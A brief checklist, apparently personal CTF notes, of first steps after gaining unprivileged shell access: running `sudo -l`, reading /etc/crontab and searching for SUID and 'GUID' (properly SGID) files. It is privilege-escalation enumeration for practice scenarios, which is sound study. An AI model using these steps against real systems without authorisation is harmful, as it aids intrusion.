## First things to do when gaining unprivileged access

Every time you have access to an account during a CTF scenario, you should use `sudo -l` to list what commands you're able to use as a super user on that account.

- `cat /etc/crontab` - Checking what cron jobs are scheduled.
- Look for SUID and GUID bit files.
